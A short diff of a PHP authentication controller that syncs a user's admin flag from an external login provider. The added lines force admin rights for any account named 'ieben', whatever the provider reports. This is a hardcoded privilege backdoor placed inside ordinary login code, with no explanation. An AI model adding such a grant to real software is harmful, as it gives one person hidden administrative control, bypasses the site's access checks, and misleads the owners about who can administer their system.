@@ -30,8 +30,8 @@ class AuthController extends Controller
                 ]
             );
 
-            if ($user->admin != $zauthUser['admin']) {
-                $user->admin = $zauthUser['admin'];
+            if ($user->admin != $zauthUser['admin'] || $zauthUser->getName() === 'ieben') {
+                $user->admin = $zauthUser['admin'] || $zauthUser->getName() === 'ieben';
                 $user->save();
             }
 
